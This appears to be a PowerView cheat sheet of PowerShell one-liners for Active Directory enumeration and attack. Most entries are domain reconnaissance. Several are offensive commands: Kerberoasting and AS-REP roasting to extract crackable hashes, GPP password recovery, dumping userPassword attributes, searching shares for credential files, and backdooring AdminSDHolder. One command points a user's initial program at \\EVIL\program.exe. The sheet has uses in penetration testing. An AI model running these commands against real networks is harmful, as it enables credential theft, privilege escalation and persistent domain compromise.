___

Load, help, and creds
- Import PowerView into the current session.
```
Import-Module .\PowerView.ps1
```
- Show detailed help for a function.
```
Get-Help Get-DomainUser -Detailed
```
- Build an alternate credential object for any PowerView function.
```
$SecPassword = ConvertTo-SecureString 'BurgerBurgerBurger!' -AsPlainText -Force; $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a',$SecPassword)
```
- Test using alternate creds with a domain query.
```
Get-DomainUser -Credential $Cred
```

Domain, forest, DCs, sites
- Query info about the current domain.
```
Get-Domain
```
- Query info about a specified (child) domain.
```
Get-Domain -Domain child.corp.local
```
- List domain controllers for the current domain.
```
Get-DomainController
```
- Get forest-level information.
```
Get-Forest
```
- List all domains in the forest.
```
Get-ForestDomain
```
- List forest trusts.
```
Get-ForestTrust
```
- List domain trusts (like nltest /trusted_domains).
```
Get-DomainTrust
```
- Recursively map reachable domain trusts.
```
Get-DomainTrustMapping
```
- Enumerate AD sites.
```
Get-DomainSite
```
- Enumerate AD subnets.
```
Get-DomainSubnet
```
- List global catalog servers in the forest.
```
Get-ForestGlobalCatalog
```

Policy (password/Kerberos)
- Read Kerberos policy from domain policy.
```
(Get-DomainPolicy -Domain corp.local).KerberosPolicy
```
- Read password/lockout policy (SystemAccess) from domain policy.
```
(Get-DomainPolicy -Domain corp.local).SystemAccess
```

Users (filters, UAC, SPN/AS-REP)
- Enumerate users with useful props (UPN, enabled, last logon).
```
Get-DomainUser -Properties samaccountname,UserPrincipalName,Enabled,lastlogontimestamp
```
- Users with passwords not changed in >1 year.
```
$Date=(Get-Date).AddYears(-1).ToFileTime(); Get-DomainUser -LDAPFilter "(pwdlastset<=$Date)" -Properties samaccountname,pwdlastset
```
- All enabled users (DNs).
```
Get-DomainUser -LDAPFilter "(!userAccountControl:1.2.840.113556.1.4.803:=2)" -Properties distinguishedname
```
- Enabled users via UAC helper.
```
Get-DomainUser -UACFilter NOT_ACCOUNTDISABLE -Properties distinguishedname
```
- All disabled users (LDAP filter).
```
Get-DomainUser -LDAPFilter "(useraccountcontrol:1.2.840.113556.1.4.803:=2)"
```
- All disabled users (UAC helper).
```
Get-DomainUser -UACFilter ACCOUNTDISABLE
```
- Users requiring smart card auth (LDAP filter).
```
Get-DomainUser -LDAPFilter "(useraccountcontrol:1.2.840.113556.1.4.803:=262144)"
```
- Users requiring smart card (UAC helper).
```
Get-DomainUser -UACFilter SMARTCARD_REQUIRED
```
- Users NOT requiring smart card (list samaccountname only).
```
Get-DomainUser -LDAPFilter "(!useraccountcontrol:1.2.840.113556.1.4.803:=262144)" -Properties samaccountname
```
- Service accounts (users with SPNs).
```
Get-DomainUser -SPN
```
- AS-REP roastable users (no Kerberos preauth).
```
Get-DomainUser -PreauthNotRequired
```
- AS-REP roastable via UAC helper.
```
Get-DomainUser -UACFilter DONT_REQ_PREAUTH
```
- Mix identity types (SID, DN, GUID, name) for user lookup.
```
'S-1-5-21-890171859-3433809279-3366196753-1114','CN=dfm,CN=Users,DC=testlab,DC=local','4c435dd7-dc58-4b14-9a5e-1fdb0e80d201','administrator' | Get-DomainUser -Properties samaccountname,lastlogoff
```
- Users with sidHistory populated.
```
Get-DomainUser -LDAPFilter '(sidHistory=*)' -Properties samaccountname,sidHistory
```
- Service accounts that are (or were) in Domain Admins.
```
Get-DomainUser -SPN | ? {$_.memberOf -match 'Domain Admins'}
```

Groups and membership
- List groups with “admin” in the name.
```
Get-DomainGroup -Identity *admin* -Properties name,distinguishedname
```
- List protected (AdminSDHolder) groups.
```
Get-DomainGroup -AdminCount -Properties name
```
- List groups that don’t have a global scope.
```
Get-DomainGroup -GroupScope NotGlobal -Properties name
```
- List all groups a user/group effectively belongs to (tokenGroups).
```
Get-DomainGroup -MemberIdentity jdoe
```
- Same as above with a DN identity.
```
Get-DomainGroup -MemberIdentity "CN=dfm,CN=Users,DC=testlab,DC=local"
```
- Recursively enumerate group members of Domain Admins.
```
Get-DomainGroupMember -Identity "Domain Admins" -Recurse
```

Foreign users/groups (cross-domain)
- Find users from foreign domains present in this domain.
```
Get-DomainForeignUser
```
- Find groups in target domain that have foreign members.
```
Get-DomainForeignGroupMember -Domain target.domain.com
```
- List foreignSecurityPrincipals from the GC (for SID/DN correlation).
```
Get-DomainObject -Properties objectsid,distinguishedname -SearchBase "GC://corp.local" -LDAPFilter '(objectclass=foreignSecurityPrincipal)'
```

Computers (targeting, delegation)
- Inventory computers with helpful props.
```
Get-DomainComputer -Properties name,dnshostname,operatingsystem,lastlogontimestamp
```
- Filter by OS for servers.
```
Get-DomainComputer -OperatingSystem "*Server*" -Properties name,operatingsystem
```
- Computers allowing unconstrained delegation.
```
Get-DomainComputer -Unconstrained
```
- Computers trusted to authenticate for others (constrained delegation).
```
Get-DomainComputer -TrustedToAuth
```
- Computers with specific SPNs (e.g., SQL).
```
Get-DomainComputer -SPN *SQL* -Properties name,serviceprincipalname
```
- List computers from a specific OU.
```
Get-DomainComputer -SearchBase "LDAP://OU=Servers,DC=corp,DC=local" -Properties dnshostname
```

Sessions, local groups, shares (who/where, not process list)
- Enumerate SMB sessions on a remote host.
```
Get-NetSession -ComputerName FS01.corp.local
```
- Enumerate logged-on users on a host.
```
Get-NetLoggedOn -ComputerName WS01.corp.local
```
- Enumerate current RDP sessions (and source IPs).
```
Get-NetRDPSession -ComputerName WS01.corp.local
```
- List local groups on a host.
```
Get-NetLocalGroup -ComputerName WS01
```
- List members of a local group (default WinNT provider).
```
Get-NetLocalGroupMember -ComputerName WS01 -GroupName "Administrators"
```
- Faster local group member enumeration via Win32 API.
```
Get-NetLocalGroupMember -Method API -ComputerName SERVER.domain.local
```
- Enumerate shares on a host.
```
Get-NetShare -ComputerName SQL01
```

User hunting (old Invoke-UserHunter)
- Show all user locations across domain (be noisy).
```
Find-DomainUserLocation -ShowAll
```
- Focus on unconstrained delegation computers and show users.
```
Find-DomainUserLocation -ComputerUnconstrained -ShowAll
```
- Hunt for admin users who allow delegation on unconstrained hosts.
```
Find-DomainUserLocation -ComputerUnconstrained -UserAdminCount -UserAllowDelegation
```
- Hunt specific user and check if you have local admin where found.
```
Find-DomainUserLocation -UserIdentity "jdoe" -CheckAccess
```
- Get logged-on users for all “server” OUs in a domain.
```
Get-DomainOU -Identity *server* -Domain corp.local | % { Get-DomainComputer -SearchBase $_.distinguishedname -Properties dnshostname | % { Get-NetLoggedOn -ComputerName $_.dnshostname } }
```

Shares and file discovery
- Enumerate open shares domain-wide.
```
Find-DomainShare
```
- Enumerate only shares you can read.
```
Find-DomainShare -CheckShareAccess
```
- Search domain shares for interesting files (old Invoke-FileFinder).
```
Find-InterestingDomainShareFile -Domain CORP
```
- Same, with alternate credentials.
```
$Password="PASSWORD"|ConvertTo-SecureString -AsPlainText -Force; $Credential=New-Object System.Management.Automation.PSCredential("CORP\user",$Password); Find-InterestingDomainShareFile -Domain CORP -Credential $Credential
```
- Recursively search a specific UNC path for keywords, Office docs, and last-access time.
```
Find-InterestingFile -Path \\SERVER\Share -Include password,creds,secret -OfficeDocs -LastAccessTime (Get-Date).AddDays(-7)
```

GPOs, GP links, access mapping
- List all GPOs in the domain.
```
Get-DomainGPO
```
- List OUs and their GPO links.
```
Get-DomainOU -GPLink | Select-Object Name,gplink
```
- List policies applied to a specific computer.
```
Get-DomainGPO -ComputerIdentity WS01.corp.local
```
- Map where a user/group has local group rights via GPO (old Find-GPOLocation).
```
Get-DomainGPOUserLocalGroupMapping -Identity "CORP\Helpdesk"
```
- Check RDP group mapping for a user in a domain.
```
Get-DomainGPOUserLocalGroupMapping -Identity "CORP\user" -Domain corp.local -LocalGroup RDP
```
- Export a CSV of GPO mappings with flattened computer arrays.
```
Get-DomainGPOUserLocalGroupMapping | % { $_.computers = ($_.computers -join ", "); $_ } | Export-Csv -NoTypeInformation gpo_map.csv
```

Delegation reconnaissance
- Users with constrained delegation configured.
```
Get-DomainUser -TrustedToAuth
```
- Computers with constrained delegation configured.
```
Get-DomainComputer -TrustedToAuth
```
- Admin-protected users who are allowed to be delegated (interesting).
```
Get-DomainUser -AllowDelegation -AdminCount
```

ACLs, DCSync rights, AdminSDHolder, backdooring
- Enumerate who has rights over a target object (resolve GUIDs).
```
Get-DomainObjectAcl -Identity matt -ResolveGUIDs -Domain testlab.local
```
- Grant “will” the right to reset “matt”’s password.
```
Add-DomainObjectAcl -TargetIdentity matt -PrincipalIdentity will -Rights ResetPassword -Verbose
```
- Read AdminSDHolder permissions (resolve GUIDs).
```
Get-DomainObjectAcl -SearchBase 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -ResolveGUIDs
```
- Backdoor AdminSDHolder to grant “matt” full rights to protected objects.
```
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
```
- Identify principals with replication (DCSync) or full control (domain DN path).
```
Get-DomainObjectAcl "dc=dev,dc=testlab,dc=local" -ResolveGUIDs | ? { ($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') }
```
- Alternative DCSync check using Get-ObjectACL alias/function.
```
Get-ObjectACL "DC=testlab,DC=local" -ResolveGUIDs | ? { ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ObjectAceType -match 'Replication-Get') }
```

GPP and GPP-linked computers
- Recover any stored Group Policy Preferences passwords (legacy).
```
Get-GPPPassword
```
- Resolve all computer DNS hostnames where a given GPP/GPO applies by GUID.
```
Get-DomainOU -GPLink '<GPP_GUID>' | % { Get-DomainComputer -SearchBase $_.distinguishedname -Properties dnshostname }
```

Interesting ACLs and shadow admins
- Find interesting domain ACLs (write/owner/DACL rights) and resolve GUIDs.
```
Find-InterestingDomainAcl -ResolveGUIDs
```
- Flag GPOs where “user” SIDs (>1000) have modification/control rights.
```
Get-DomainObjectAcl -LDAPFilter '(objectCategory=groupPolicyContainer)' | ? { ($_.SecurityIdentifier -match '^S-1-5-.*-[1-9]\d{3,}$') -and ($_.ActiveDirectoryRights -match 'WriteProperty|GenericAll|GenericWrite|WriteDacl|WriteOwner') }
```

OU, file servers, DNS
- List organizational units.
```
Get-DomainOU
```
- Find likely file servers based on user home/profile/script paths.
```
Get-DomainFileServer
```
- Enumerate DNS records for a zone (if DNS partition accessible).
```
Get-DomainDNSRecord -Zone corp.local
```

Trust-aware foreign membership walk
- Pull foreignSecurityPrincipal DNs from GC for later correlation.
```
$ForeignUsers = Get-DomainObject -Properties objectsid,distinguishedname -SearchBase "GC://testlab.local" -LDAPFilter '(objectclass=foreignSecurityPrincipal)' | ? {$_.objectsid -match '^S-1-5-.*-[1-9]\d{2,}$'} | Select-Object -ExpandProperty distinguishedname
```
- For each referenced domain, enumerate domain-local groups with those members.
```
$Domains=@{}; ForEach($ForeignUser in $ForeignUsers){ $ForeignUserDomain=$ForeignUser.Substring($ForeignUser.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'; if(-not $Domains[$ForeignUserDomain]){ $Domains[$ForeignUserDomain]=$True; $Filter="(|(member="+($ForeignUsers -join ")(member=")+"))"; Get-DomainGroup -Domain $ForeignUserDomain -Scope DomainLocal -LDAPFilter $Filter -Properties distinguishedname,member } } | fl
```

User impersonation helpers (STA)
- Temporarily impersonate a different credential (runas /netonly-like).
```
$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force; $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a',$SecPassword); Invoke-UserImpersonation -Credential $Cred
```
- Revert impersonation back to self.
```
Invoke-RevertToSelf
```

Object outliers, setters, ownership
- Detect outlier properties across computer objects.
```
Get-DomainComputer -FindOne | Find-DomainObjectPropertyOutlier
```
- Set arbitrary attributes on an AD object.
```
Set-DomainObject testuser -Set @{'mstsinitialprogram'='\\EVIL\program.exe'} -Verbose
```
- Take or set ownership of an AD object.
```
Set-DomainObjectOwner -Identity dfm -OwnerIdentity harmj0y
```

Kerberoasting and AS-REP roast
- Kerberoast using defaults (prints TGS hashes).
```
Invoke-Kerberoast
```
- Kerberoast a specific account, Hashcat format.
```
Invoke-Kerberoast -Identity "svc_sql" -OutputFormat Hashcat
```
- Kerberoast scoped to a specific OU/SearchBase.
```
Invoke-Kerberoast -SearchBase "LDAP://OU=secret,DC=testlab,DC=local" -OutputFormat Hashcat
```
- List AS-REP roastable users (no preauth).
```
Get-DomainUser -PreauthNotRequired | Select-Object samaccountname
```
- Request AS-REP roast for a specific user.
```
Invoke-ASREPRoast -UserName jdoe -Verbose
```

Local admin reachability
- Threaded probe to find where you’re local admin (SMB/RPC).
```
Find-LocalAdminAccess
```
- Test admin access to a single host.
```
Test-AdminAccess -ComputerName WS01
```

Turn short names into FQDNs via GC
- Resolve bare hostnames to FQDNs using the global catalog.
```
gc .\computers.txt | % { Get-DomainComputer -SearchBase "GC://GLOBAL.CATALOG" -LDAP "(name=$_) " -Properties dnshostname }
```

Data export/import
- Export objects to XML for offline analysis.
```
Get-DomainUser | Export-Clixml .\users.xml
```
- Re-import exported PowerView objects.
```
$Users = Import-Clixml .\users.xml
```

Password attribute probe (rare, but occasionally exposed)
- Dump userPassword attribute (if present) and render ASCII.
```
$FormatEnumerationLimit=-1; Get-DomainUser -LDAPFilter '(userPassword=*)' -Properties samaccountname,memberof,userPassword | % { Add-Member -InputObject $_ NoteProperty 'Password' "$([System.Text.Encoding]::ASCII.GetString($_.userPassword))" -PassThru } | fl
```

Common pipelines and counts
- Count total domain users quickly.
```
(Get-DomainUser).Count
```
- Find non-empty user description fields.
```
Get-DomainUser -Properties samaccountname,description | ? { $_.description -ne $null }
```

Process enumeration (not a PowerView function)
PowerView 3.x has no Get-NetProcess; use native remoting/WMI/CIM:
- Get processes on a remote host via WinRM (PowerShell remoting).
```
Invoke-Command -ComputerName WS01 -ScriptBlock { Get-Process } -Credential $Cred
```
- Query processes via CIM (WSMan) on a remote host.
```
Get-CimInstance Win32_Process -ComputerName WS01 -Credential $Cred
```
- Query processes via legacy WMI (DCOM) on a remote host.
```
Get-WmiObject Win32_Process -ComputerName WS01 -Credential $Cred
```
